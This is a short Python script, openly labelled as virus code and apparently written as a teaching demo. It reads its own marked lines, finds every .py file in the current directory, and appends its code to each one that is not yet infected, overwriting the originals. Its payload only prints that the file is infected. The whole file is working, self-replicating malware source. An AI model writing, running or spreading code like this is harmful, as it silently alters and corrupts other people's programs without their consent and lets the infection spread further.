#starting virus code

import sys,re,glob

#put a copy of all these lines into a list

virusCode =[]

#open this file and read all lines
#filter out all lines that are not inside the virus code boundary
thisFile=sys.argv[0]
virusFile=open(thisFile,"r")
lines=virusFile.readlines()
virusFile.close()
#save the lines into a list to use later
inVirus= False

for line in lines:
    
    if(re.search("^#starting virus code",line)):
        inVirus=True
    
    #if the virus code has been found, start appending the
    #lines to the virusCode list. We assume that the virus
    #code is always appended to the end of the script.
    
    if(inVirus==True):
        virusCode.append(line)
    if(re.search("^#end of virus code",line)):
        break
    
#find potential victims
programs = glob.glob("*.py")
#check and infact all programs that glob found
for p in programs:
    file = open(p,"r")
    programCode= file.readlines()
    file.close()
    #check if the file is already infacted
    infected= False
    for line in programCode:
        if(re.search("^#starting virus code", line)):
            infected= True
            break
    #no need to infect it again.
    if not infected:
        newCode= []
        #newVersion = current version + virus code
        newCode = programCode
        newCode.extend(virusCode)
        #new version of file. overwrite the original
        file = open(p,"w")
        file.writelines(newCode)
        file.close()
        
#payload-print file is infected
print("This file is infected")
#end of virus code
